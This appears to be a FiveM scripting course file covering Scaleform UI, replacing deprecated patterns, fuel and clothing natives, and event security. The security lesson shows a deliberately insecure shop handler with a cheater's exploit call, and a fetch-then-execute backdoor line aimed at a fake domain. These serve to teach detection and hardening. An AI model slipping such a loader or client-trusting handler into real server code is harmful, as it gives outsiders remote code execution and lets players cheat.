@@ -1,0 +1,623 @@
+=== scaleform | Scaleform | Using Scaleform | 12
+docs: Using Scaleform | https://docs.fivem.net/docs/scripting-manual/using-scaleform/
+--- summary
+Scaleform is GTA's own Flash-based UI. Load a movie, call its functions, and draw it every frame to show big game-style messages.
+
+--- section What Scaleform is
+**Scaleform GFx** is the UI system GTA V itself uses for things like the "WASTED" screen, mission passed banners, the phone and instructional buttons. Each UI is a "movie" (a `.gfx` file) with functions you can call from your script. Using the built-in ones is easy; making your own requires Adobe Flash CS6 and ActionScript 2, which this lesson only mentions.
+
+All Scaleform natives are client-side and live in the GRAPHICS namespace of the Native Reference.
+
+--- section The four steps
+1. **Load:** `RequestScaleformMovie('name')` returns a handle. Loop on `HasScaleformMovieLoaded(handle)` until it is ready.
+2. **Call a function:** `BeginScaleformMovieMethod(handle, 'FUNCTION_NAME')`, then add parameters, then `EndScaleformMovieMethod()`.
+3. **Draw:** call a draw native **every frame**, for as long as you want it visible.
+4. **Release:** `SetScaleformMovieAsNoLongerNeeded(handle)` when you are done.
+
+Parameter natives:
+
+- `ScaleformMovieMethodAddParamInt`, `ScaleformMovieMethodAddParamFloat`, `ScaleformMovieMethodAddParamBool`
+- `ScaleformMovieMethodAddParamTextureNameString` for **short** strings such as texture names
+- For normal text: `BeginTextCommandScaleformString('STRING')`, `AddTextComponentSubstringPlayerName(text)`, `EndTextCommandScaleformString()`
+
+--- section Example: a big "shard" message
+This shows the freemode big message for five seconds, based on the docs' example.
+
+```lua file=client.lua
+local function addText(text)
+    BeginTextCommandScaleformString('STRING')
+    AddTextComponentSubstringPlayerName(text)
+    EndTextCommandScaleformString()
+end
+
+local function showShard(title, subtitle, durationMs)
+    CreateThread(function()
+        local scaleform = RequestScaleformMovie('mp_big_message_freemode')
+        while not HasScaleformMovieLoaded(scaleform) do
+            Wait(0)
+        end
+
+        BeginScaleformMovieMethod(scaleform, 'SHOW_SHARD_WASTED_MP_MESSAGE')
+        addText(title)      -- big text
+        addText(subtitle)   -- smaller text
+        ScaleformMovieMethodAddParamInt(5) -- colour ID
+        EndScaleformMovieMethod()
+
+        local endTime = GetGameTimer() + durationMs
+        while GetGameTimer() < endTime do
+            DrawScaleformMovieFullscreen(scaleform, 255, 255, 255, 255, 0)
+            Wait(0) -- draw every single frame
+        end
+
+        SetScaleformMovieAsNoLongerNeeded(scaleform)
+    end)
+end
+
+RegisterCommand('shard', function(source, args)
+    local title = args[1] or 'MISSION PASSED'
+    showShard(title, 'Respect +', 5000)
+end, false)
+```
+
+The draw call has to run every frame because Scaleform is redrawn from scratch each frame, just like `DrawMarker`. The docs note the color and alpha arguments can be left at defaults since they do not affect anything.
+
+--- section Drawing options
+- `DrawScaleformMovie` draws at a position and size on screen.
+- `DrawScaleformMovieFullscreen` fills the whole screen (most built-in movies are made for this).
+- `DRAW_SCALEFORM_MOVIE_3D` draws in the world. With blackout enabled it gets "solarized" yellow colours.
+- `DrawScaleformMovieFullscreenMasked` draws one movie masked by another (no anti-aliasing).
+
+--- deeper Making your own .gfx
+- You need **Adobe Flash Pro CS6**, **ActionScript 2** (AS3 is not supported) targeting Flash Player 8, and `gfxexport.exe` from the Scaleform GFx 4.0 SDK to convert `.swf` to `.gfx`.
+- Your movie must have a global `TIMELINE` variable; its members are the functions scripts can call.
+- Scaleform has no shape filters, no blur on text (fake it with glow), no real masking, and no embedded raster images. Load textures with the `img://txdName/textureName` protocol instead, for example `img://mpcarhud/albany`.
+- Some movies accept simple HTML such as `<b>`, `<br>` and font tags like `<FONT FACE='$Font2'>`.
+- The docs provide a boilerplate project to start from.
+
+--- framework
+Frameworks rarely use Scaleform directly, but ox_lib and many HUDs use it for instructional buttons (the key hints in the bottom right). Big "shard" messages like the one above are a cheap way to add game-style feedback for job completions or events.
+
+--- task Show a job-complete banner
+1. Add the `/shard` command to a test resource and try `/shard PAYDAY`.
+2. Change the duration to 3 seconds and the subtitle to show a dollar amount.
+3. Bonus: register a client event `myjob:complete` that calls `showShard`, and trigger it from a server command with `TriggerClientEvent`.
+
+--- quiz
+? Why do you loop on `HasScaleformMovieLoaded` after requesting the movie?
+- To make it fade in
++ Because the movie loads asynchronously and cannot be used until it is ready
+- Because you must request it every frame
+- To check the player owns it
+> Like models, Scaleform movies load in the background. Using one before it is loaded does nothing.
+
+? How often do you call `DrawScaleformMovieFullscreen`?
+- Once, right after EndScaleformMovieMethod
++ Every frame, for as long as it should be visible
+- Once per second
+- Only when the screen size changes
+> Scaleform is drawn per frame, so it sits inside a loop with Wait(0).
+
+? How should you pass a normal sentence of text as a Scaleform parameter?
+- ScaleformMovieMethodAddParamInt
+- ScaleformMovieMethodAddParamTextureNameString
++ BeginTextCommandScaleformString, AddTextComponentSubstringPlayerName, EndTextCommandScaleformString
+- SendNUIMessage
+> The texture-name string native is only for short strings like texture names; text commands handle normal text.
+
+=== migrating | Migrating | Migrating from deprecated methods | 10
+docs: Migrating from deprecated methods | https://docs.fivem.net/docs/scripting-manual/migrating-from-deprecated/
+docs: Chat messages | https://docs.fivem.net/docs/scripting-manual/migrating-from-deprecated/chat-messages/
+docs: Creating commands | https://docs.fivem.net/docs/scripting-manual/migrating-from-deprecated/creating-commands/
+--- summary
+Old tutorials are full of outdated patterns. Learn to spot them and replace them with the modern methods this course uses.
+
+--- section Chat messages: chatMessage to chat:addMessage
+The old `chatMessage` event took three separate values: author, color and text. It is deprecated. The `chat:addMessage` event takes one table with `color`, `multiline` and `args`.
+
+```lua file=client.lua
+-- OLD (deprecated)
+TriggerEvent('chatMessage', GetPlayerName(PlayerId()), { 255, 255, 255 }, 'Hello!')
+
+-- NEW
+TriggerEvent('chat:addMessage', {
+    color = { 255, 255, 255 },
+    multiline = true,
+    args = { GetPlayerName(PlayerId()), 'Hello!' }
+})
+```
+
+From the server, send it to one player with `TriggerClientEvent('chat:addMessage', playerId, {...})` or to everyone with `-1`.
+
+--- section Commands: chat parsing to RegisterCommand
+Old scripts listened to every chat message, checked if it started with `/`, and split the text themselves. The docs say to **always** use `RegisterCommand` instead: it works from chat and the console, supports auto-completion, and plugs into the ACE permission system.
+
+```lua file=server.lua
+RegisterCommand('commandName', function(source, args, rawCommand)
+    if source > 0 then
+        print('Run by player ' .. source)
+    else
+        print('Run from the server console')
+    end
+end, true) -- true = restricted: needs the 'command.commandName' ACE
+```
+
+Give the permission in `server.cfg`:
+
+```cfg file=server.cfg
+add_ace group.admin command.commandName allow
+```
+
+You can also show players a hint while they type. The `chat` resource listens for `chat:addSuggestion` on the client:
+
+```lua file=client.lua
+TriggerEvent('chat:addSuggestion', '/car', 'Spawn a vehicle', {
+    { name = 'model', help = 'Vehicle model name, e.g. adder' }
+})
+```
+
+--- section Other modern replacements
+These patterns are not deprecated warnings in the docs, but the docs' own current examples use the newer form. Updating them makes scripts easier to read.
+
+| You will see | Modern equivalent |
+| --- | --- |
+| `__resource.lua` with `resource_manifest_version` | `fxmanifest.lua` with `fx_version 'cerulean'` and `game 'gta5'` |
+| `RegisterServerEvent('x')` + `AddEventHandler('x', fn)` | `RegisterNetEvent('x', fn)` |
+| `Citizen.CreateThread` / `Citizen.Wait` | `CreateThread` / `Wait` (same functions, shorter names) |
+| `GetPlayerPed(-1)` on the client | `PlayerPedId()` |
+| `GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true)` | `#(vector3(...) - vector3(...))` |
+| `lua54 'yes'` in the manifest | Not needed: all Lua runs on 5.4 |
+| `nui://resource/file` in NUI pages | `https://cfx-nui-resource/file` |
+
+```lua file=server.lua
+-- OLD
+RegisterServerEvent('shop:buy')
+AddEventHandler('shop:buy', function(item)
+    -- ...
+end)
+
+-- NEW
+RegisterNetEvent('shop:buy', function(item)
+    -- ...
+end)
+```
+
+```lua file=client.lua
+-- OLD
+Citizen.CreateThread(function()
+    while true do
+        Citizen.Wait(0)
+        local coords = GetEntityCoords(GetPlayerPed(-1))
+        if GetDistanceBetweenCoords(coords.x, coords.y, coords.z, 25.7, -1347.3, 29.5, true) < 2.0 then
+            -- ...
+        end
+    end
+end)
+
+-- NEW
+local shop = vector3(25.7, -1347.3, 29.5)
+CreateThread(function()
+    while true do
+        local coords = GetEntityCoords(PlayerPedId())
+        if #(coords - shop) < 2.0 then
+            -- ...
+        end
+        Wait(0)
+    end
+end)
+```
+
+--- deeper Migrating from other platforms
+The docs also have a guide for people coming from other GTA V multiplayer platforms. The main ideas carry over: FiveM's events replace their remote calls, natives are called directly instead of through wrapper objects, and the server only trusts what it checks itself.
+
+--- framework
+Older ESX scripts are the most common source of these patterns (for example `TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)`). Current ESX uses `ESX = exports['es_extended']:getSharedObject()` or the `@es_extended/imports.lua` shared script. Current QBCore uses `exports['qb-core']:GetCoreObject()`.
+
+--- task Modernize an old script
+1. Pick a small, simple script on your server (back it up first).
+2. Search it for `chatMessage`, `RegisterServerEvent`, `Citizen.Wait`, `GetPlayerPed(-1)` and `GetDistanceBetweenCoords`.
+3. Replace each with the modern form from this lesson.
+4. `restart` it and test that it still works exactly as before.
+
+--- quiz
+? What should replace `TriggerEvent('chatMessage', 'Bob', {255,0,0}, 'Hi')`?
+- TriggerEvent('chat:message', 'Bob', 'Hi')
++ TriggerEvent('chat:addMessage', { color = {255,0,0}, args = {'Bob', 'Hi'} })
+- print('Bob: Hi')
+- SendNUIMessage({ text = 'Hi' })
+> chat:addMessage takes one table with color, multiline and args.
+
+? A `RegisterCommand` call ends with `true`. What does that do?
+- Shows the command in chat suggestions
++ Restricts it to players with the matching command.name ACE
+- Makes it client-only
+- Logs every use
+> The restricted flag ties the command into the ACL system: players need the `command.<name>` ACE.
+
+? Which is the modern way to register a server event from clients?
+- RegisterServerEvent('x') then AddEventHandler('x', fn)
++ RegisterNetEvent('x', function(...) end)
+- AddEventHandler('x', fn) on the client
+- RegisterCommand('x', fn)
+> RegisterNetEvent with a handler registers and listens in one call.
+
+=== game-features | New features | Using new game features | 12
+docs: Using new game features | https://docs.fivem.net/docs/scripting-manual/using-new-game-features/
+docs: Fuel consumption | https://docs.fivem.net/docs/scripting-manual/using-new-game-features/fuel-consumption/
+docs: Collection-based natives | https://docs.fivem.net/docs/scripting-manual/using-new-game-features/collection-based-natives/
+--- summary
+FiveM adds features the base game never had: real fuel consumption, and clothing natives that do not break when GTA updates.
+
+--- section Fuel consumption
+In GTA V vehicles never use fuel. FiveM lets you switch real consumption on with `SetFuelConsumptionState(true)` (client), and check it with `GetFuelConsumptionState()`.
+
+When on, fuel burns at:
+
+```text file=formula
+time_step * rpm * vehicle_fuel_consumption_rate_multiplier * global_fuel_consumption_rate_multiplier
+```
+
+So higher revs burn more fuel, and an engine that is off burns none. A 65 litre car with average consumption lasts about 16.67 hours idling or about 2.5 hours at max RPM.
+
+- **Global rate:** `SetFuelConsumptionRateMultiplier(value)` (default 1, negatives become 0).
+- **Per vehicle:** handling field `fPetrolConsumptionRate` (default 0.5) via `SetVehicleHandlingFloat` or `handling.meta`.
+- **Tank size:** handling field `fPetrolTankVolume`.
+- **Current fuel:** `GetVehicleFuelLevel` / `SetVehicleFuelLevel`.
+
+Fuel is not used by NPC-only vehicles, bicycles, or vehicles with a tank volume of 0. `DoesVehicleUseFuel(vehicle)` tells you if a vehicle will consume fuel.
+
+--- section Example: a simple refuel point
+FiveM does not include gas stations, so you build them. This is a trimmed version of the docs' example. Note it only shows help text when you are at the station, and it sleeps when you are not in a car.
+
+```lua file=client.lua
+local stations = {
+    { coords = vector3(64.55, 20.4, 68.9), radius = 8.0 },
+}
+
+AddTextEntry('FUEL_HELP', 'Press ~INPUT_VEH_HEADLIGHT~ to fill the tank.')
+
+local function atStation(coords)
+    for _, station in ipairs(stations) do
+        if #(coords - station.coords) <= station.radius then
+            return true
+        end
+    end
+    return false
+end
+
+CreateThread(function()
+    SetFuelConsumptionState(true)
+
+    while true do
+        local sleep = 1000
+        local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
+
+        if vehicle ~= 0 and DoesVehicleUseFuel(vehicle) and atStation(GetEntityCoords(vehicle)) then
+            sleep = 0
+            BeginTextCommandDisplayHelp('FUEL_HELP')
+            EndTextCommandDisplayHelp(0, false, false, -1)
+
+            if IsControlJustPressed(0, 74) then -- 74 = H (vehicle headlight)
+                local tank = GetVehicleHandlingFloat(vehicle, 'CHandlingData', 'fPetrolTankVolume')
+                SetVehicleFuelLevel(vehicle, tank)
+            end
+        end
+
+        Wait(sleep)
+    end
+end)
+```
+
+! On a real RP server, refuelling should cost money, which means the client asks the server, the server checks the player is at a station and takes the money, then tells the client to fill up. See the security lesson.
+
+--- section Clothing collections
+Ped clothes ("drawables") and props used to be addressed by a **global index**. Every GTA title update adds new DLC clothing *before* custom clothing, so all custom indexes shift and outfits break. The new **collection-based natives** address clothes by **collection name + local index**, which stays the same across updates. They are client-only.
+
+```lua file=client.lua
+local function setLook(ped)
+    -- head (component 0) from the base game collection (''), local index 27
+    SetPedCollectionComponentVariation(ped, 0, '', 27, 0, 0)
+
+    -- pants (component 4) from the heist DLC collection, local index 9, texture 3
+    SetPedCollectionComponentVariation(ped, 4, 'female_heist', 9, 3, 0)
+
+    -- hat (anchor point 0) from the biker DLC collection
+    SetPedCollectionPropIndex(ped, 0, 'mp_f_bikerdlc_01', 0, 0, false)
+end
+
+RegisterCommand('pantsinfo', function()
+    local ped = PlayerPedId()
+    local collection = GetPedDrawableVariationCollectionName(ped, 4)
+    local localIndex = GetPedDrawableVariationCollectionLocalIndex(ped, 4)
+    print(('Pants: collection "%s", local index %d'):format(collection, localIndex))
+end, false)
+```
+
+Collection names come from the `<CPedVariationInfo name="...">` tag in each clothing pack's `.ymt` file. The base game collection's name is an empty string.
+
+--- deeper Collection natives at a glance
+- Info: `GetPedCollectionsCount`, `GetPedCollectionName`
+- Convert global to local: `GetPedCollectionNameFromDrawable`, `GetPedCollectionLocalIndexFromDrawable` (and the `...FromProp` versions)
+- Convert local to global: `GetPedDrawableGlobalIndexFromCollection`, `GetPedPropGlobalIndexFromCollection`
+- Replacements: `SetPedComponentVariation` becomes `SetPedCollectionComponentVariation`, `SetPedPropIndex` becomes `SetPedCollectionPropIndex`, `GetNumberOfPedDrawableVariations` becomes `GetNumberOfPedCollectionDrawableVariations`, and so on.
+
+--- framework
+Fuel resources such as LegacyFuel or ox_fuel manage fuel themselves, so do not turn on `SetFuelConsumptionState` alongside one without checking how it works. Clothing menus (illenium-appearance, qb-clothing) still mostly save global indexes; if your outfits shuffle after a game update, collection-based saving is the long-term fix.
+
+--- task Check your fuel
+1. Write a client command `/fuel` that prints `GetVehicleFuelLevel` and the `fPetrolTankVolume` of the car you are in.
+2. On a test server without a fuel resource, call `SetFuelConsumptionState(true)` and drive at high revs, running `/fuel` now and then.
+3. Run `/pantsinfo` and note your pants' collection name and local index.
+
+--- quiz
+? Why do custom clothing indexes break after a GTA title update?
+- Rockstar deletes custom clothing
++ New official DLC collections are inserted before custom ones, shifting their global indexes
+- FiveM resets all ped variations
+- The .ymt files expire
+> Global indexes count from the start of all collections. Collection name + local index stays stable.
+
+? When fuel consumption is on, when does a vehicle use no fuel?
+- When it is moving downhill
++ When the engine is off, it is a bicycle, or only NPCs are in it
+- When the player is in first person
+- Never, all vehicles use fuel
+> The docs list engine off, NPC-only vehicles, bicycles and tank volume 0 as exceptions.
+
+? Which native turns fuel consumption on?
+- SetVehicleFuelLevel(vehicle, 100.0)
++ SetFuelConsumptionState(true)
+- SetFuelConsumptionRateMultiplier(1.0)
+- DoesVehicleUseFuel(vehicle)
+> SetFuelConsumptionState toggles the feature; the rate multiplier only changes how fast fuel burns.
+
+=== security | Security | Secure your events and spot backdoors | 22
+docs: Secure Your Events | https://docs.fivem.net/docs/developers/server-security/
+docs: Listening for events | https://docs.fivem.net/docs/scripting-manual/working-with-events/listening-for-events/
+docs: Example secure resources (linked from the docs) | https://github.com/TheIndra55/secure-resource-examples
+--- summary
+Cheaters can trigger any event with any values. Validate everything on the server, use permissions, and learn the warning signs of a backdoored resource.
+
+--- section Assume every client is lying
+Cheats let a player trigger events in any context: **client to server** (`TriggerServerEvent`) and **one client resource to another** (`TriggerEvent`). They can send any values they like, as often as they like. The anti-cheat catches a lot, but the docs are clear: your own server-side checks are what keep your economy safe.
+
+So for every network event, ask: *if a cheater sent this event right now, with the worst possible values, what happens?*
+
+--- section Register only what needs to be networked
+- Use `AddEventHandler` for events that only your own side triggers (server to server, client to client). They cannot be called from the other side.
+- Use `RegisterNetEvent` only for events the other side really needs to call.
+
+A server event that is only meant to be called by other server scripts should **not** be a net event. If it is, a cheater can call it directly.
+
+On the client, events sent by the server arrive with `source` set to `65535`. You can use that to refuse calls from other client resources (this is not bullet proof; anything on the client can be modified):
+
+```lua file=client.lua
+RegisterNetEvent('myjob:client:startJob', function(jobData)
+    -- server-sent events have source 65535; ignore anything else
+    if source ~= 65535 then return end
+    -- ...
+end)
+```
+
+--- section Bad: trusting the client
+```lua file=server.lua
+-- NEVER DO THIS
+RegisterNetEvent('shop:buy', function(item, count, price)
+    local src = source
+    -- the client chose the item, the amount AND the price
+    exports.myframework:RemoveMoney(src, price)
+    exports.myframework:AddItem(src, item, count)
+end)
+```
+
+A cheater can call `TriggerServerEvent('shop:buy', 'weapon_rpg', 100, 0)` and get 100 rocket launchers for free. (The `exports.myframework` calls are placeholders for your framework.)
+
+--- section Good: the server decides
+The fix: the client only says **what it wants**. The server looks up the price itself, checks the values, checks where the player is, rate-limits, and only then acts.
+
+```lua file=server.lua
+local SHOP_COORDS = vector3(25.7, -1347.3, 29.5)
+local MAX_DISTANCE = 5.0
+
+-- prices live on the server, never in the event
+local ITEMS = {
+    water = { price = 5 },
+    sandwich = { price = 8 },
+}
+
+local lastPurchase = {}
+
+RegisterNetEvent('shop:buy', function(itemName, count)
+    local src = source
+
+    -- 1. validate types and ranges
+    if type(itemName) ~= 'string' or type(count) ~= 'number' then return end
+    count = math.floor(count)
+    if count < 1 or count > 10 then return end
+
+    -- 2. whitelist: only items this shop sells
+    local item = ITEMS[itemName]
+    if not item then return end
+
+    -- 3. distance: is the player actually at the shop? (server-side position)
+    local ped = GetPlayerPed(src)
+    if #(GetEntityCoords(ped) - SHOP_COORDS) > MAX_DISTANCE then return end
+
+    -- 4. cooldown: at most one purchase per second
+    local now = GetGameTimer()
+    if lastPurchase[src] and now - lastPurchase[src] < 1000 then return end
+    lastPurchase[src] = now
+
+    -- 5. act, using values the server computed
+    local total = item.price * count
+    -- if exports.myframework:RemoveMoney(src, total) then
+    --     exports.myframework:AddItem(src, itemName, count)
+    -- end
+    print(('%s bought %dx %s for $%d'):format(GetPlayerName(src), count, itemName, total))
+end)
+
+AddEventHandler('playerDropped', function()
+    lastPurchase[source] = nil
+end)
+```
+
+Things to check on network events, from the docs: player **money**, **state bags**, **inventory items**, **position**, **experience/level** and **permissions/roles**. Always read these with server-side methods, never from values the client sent.
+
+--- section Server-owned job state
+For jobs, keep track of who is actually doing the job **on the server**, and pay out from that record. This is the docs' job pattern, with two small bugs from the original page fixed (the loop now uses its own `src`, and the turn-in handler gets the ped before using it).
+
+```lua file=server.lua
+local JOB_COORDS = vector3(125.0, 111.1, 35.83)
+local TURNIN_COORDS = vector3(1888.0, 1254.1, 48.0)
+local MAX_ITEMS = 10
+
+local activeJobs = {} -- [serverId] = { itemCount = number }
+
+local function isNear(src, coords)
+    return #(GetEntityCoords(GetPlayerPed(src)) - coords) < 15.0
+end
+
+AddEventHandler('playerDropped', function()
+    activeJobs[source] = nil
+end)
+
+-- the server counts progress once per second, only while the player is at the job site
+CreateThread(function()
+    while true do
+        for src, data in pairs(activeJobs) do
+            if isNear(src, JOB_COORDS) then
+                data.itemCount = math.min(data.itemCount + 1, MAX_ITEMS)
+            end
+        end
+        Wait(1000)
+    end
+end)
+
+RegisterNetEvent('job:startJob', function()
+    local src = source
+    if isNear(src, JOB_COORDS) then
+        activeJobs[src] = { itemCount = 0 }
+    end
+end)
+
+RegisterNetEvent('job:turnIn', function()
+    local src = source
+    local job = activeJobs[src]
+    if not job then return end                       -- never started: reject
+    if not isNear(src, TURNIN_COORDS) then return end -- not at the turn-in point: reject
+
+    activeJobs[src] = nil -- reset first so it cannot be triggered twice
+    -- exports.myframework:AddItem(src, 'log', job.itemCount)
+    print(('%s turned in %d logs'):format(GetPlayerName(src), job.itemCount))
+end)
+```
+
+Notice the client never says how many logs it has. It just says "I'm done", and the server pays out what *it* counted.
+
+--- section ACE permissions for admin actions
+Admin commands and events must check permissions on the server. FiveM's built-in system is **ACE** (access control entries) with **principals** (groups and identifiers).
+
+```cfg file=server.cfg
+# give a group permission to a custom ACE
+add_ace group.admin myresource.admin allow
+
+# put a player (by license) into that group
+add_principal identifier.license:abc123yourlicensehere group.admin
+```
+
+```lua file=server.lua
+-- restricted command: needs the command.heal ACE automatically
+RegisterCommand('heal', function(source, args)
+    -- ...
+end, true)
+
+-- custom check, for events and anything that is not a command
+RegisterNetEvent('admin:teleportTo', function(targetId)
+    local src = source
+    if not IsPlayerAceAllowed(src, 'myresource.admin') then
+        print(('%s tried an admin event without permission'):format(GetPlayerName(src)))
+        return
+    end
+    -- ...
+end)
+```
+
+The client can hide or show admin buttons for convenience, but the **server check is the only one that counts**.
+
+--- section Checklist for every server event
+- Is it a net event only because it needs to be?
+- Did I copy `local src = source` and use `src`, never a player ID sent by the client?
+- Are all arguments the right **type**, in a sane **range**, and on a **whitelist**?
+- Are prices, rewards and amounts decided by the **server**?
+- Is the player **near** where this action happens (server-side coords)?
+- Is there a **cooldown** or one-time flag so it cannot be spammed?
+- Do admin actions check **IsPlayerAceAllowed**?
+- Do I clean up per-player tables in **playerDropped**?
+
+--- section Spotting backdoored resources
+A **backdoor** is hidden code in a resource (often a leaked or "free" paid script) that lets someone else run commands on your server, give themselves admin, or steal your database. Warning signs:
+
+- **Remote code loading.** `PerformHttpRequest` that downloads text and then runs it with `load(...)`, `assert(load(...))()` or, in JS, `eval` / `new Function`. A real script almost never needs to run code downloaded at runtime.
+- **Obfuscation.** Long strings of escape codes (`"\x50\x65..."` or `"\80\101..."`), huge `string.char(...)` calls, base64 blobs, variable names like `_0x3f2a`, or one gigantic line of unreadable code in a resource that is not escrowed by its author.
+- **Files that do not belong.** A `.js` file in a Lua-only resource, a server script with a generic name (`sv_utils.lua`, `version.lua`) that is not mentioned in the docs, or a manifest glob like `'**/*.lua'` that quietly loads it.
+- **Sending your secrets out.** Code that reads convars (license key, RCON password, database connection string) or player identifiers and sends them to a URL or Discord webhook.
+- **Mystery net events.** `RegisterNetEvent` handlers with odd names that run whatever text they receive, or that give admin/money with no checks.
+
+This illustration (with a fake domain) shows the shape to look for. Do not run it:
+
+```lua file=server.lua
+-- RED FLAG: downloads text from the internet and executes it as code
+PerformHttpRequest('https://example.invalid/payload', function(status, body)
+    if body then load(body)() end
+end)
+```
+
+`PerformHttpRequest` by itself is fine (version checks, webhooks for logs). The danger is **downloaded text being executed**.
+
+--- section If you find one
+1. Stop the resource and remove it from `server.cfg`.
+2. Search **all** your resources for the same pattern; backdoors often copy themselves into other resources.
+3. Change your RCON password, database password, license key and any webhook URLs it could have read.
+4. Check your database and ACE config for admins or money you did not add.
+5. Replace the script with a clean copy from the original author, and test new resources on a separate test server first.
+
+Use the scanner below to check a file you are unsure about. It looks for the red flags above; it cannot prove a file is safe, so read anything it flags yourself.
+
+--- deeper Server owner options from the docs
+The docs list some server convars that work with Cfx.re's anti-cheat, enabled by default from FXServer build 8450. Only change them if you know what you are doing:
+
+- `sv_kick_players_cnl_timeout_sec`, `sv_kick_players_cnl_update_rate_sec`, `sv_kick_players_cnl_consecutive_failures` control kicking players whose connection to Cfx.re's network ("CnL") times out. Kicked players see `Connection to CNL timed out.`
+- `sv_pure_verify_client_settings` verifies client settings like pure level.
+- `sv_authMaxVariance` and `sv_authMinTrust` control how strictly player identifiers are trusted.
+- `sv_filterRequestControl` can block `REQUEST_CONTROL_EVENT` routing (taking control of other players' entities).
+- `sv_disableClientReplays` reduces cheating options but disables the Rockstar Editor.
+
+--- framework
+Framework functions do not make events safe by themselves. `QBCore.Functions.GetPlayer(src).Functions.AddMoney(...)` or `xPlayer.addMoney(...)` will happily add whatever amount you pass. The validation steps in this lesson still apply. Prefer framework callbacks and exports that run on the server, and never accept prices or rewards from the client.
+
+--- task Audit one event on your server
+1. Open a server script from a job or shop on your server and find every `RegisterNetEvent`.
+2. For one event, go through the checklist above and write down which checks are missing.
+3. On your test server, open F8 and imagine you are a cheater: what values would you send? Add the missing checks.
+4. Paste a resource you downloaded recently into the scanner below and look at anything it flags.
+
+--- quiz
+? A client sends `TriggerServerEvent('shop:buy', 'water', 2, 10)`, where 10 is the price. What should the server do with the price?
+- Use it, since the client UI shows the same price
+- Use it only if it is above zero
++ Ignore it and look up the price on the server
+- Multiply it by the count
+> Prices, rewards and amounts must come from server-side data. The client only says what it wants.
+
+? Which of these is the strongest sign of a backdoor?
+- A resource uses PerformHttpRequest to check for updates
+- A resource has a config.lua
++ Text downloaded with PerformHttpRequest is passed to load() and executed
+- A resource uses state bags
+> Running downloaded code lets whoever controls that URL run anything on your server.
+
+? How should a server event for an admin teleport check permissions?
+- Hide the button in the NUI for non-admins
+- Check a value the client sends, like isAdmin = true
++ Call IsPlayerAceAllowed(src, 'myresource.admin') on the server
+- Use AddEventHandler instead of RegisterNetEvent
+> Only a server-side permission check counts. UI hiding and client values can be faked.
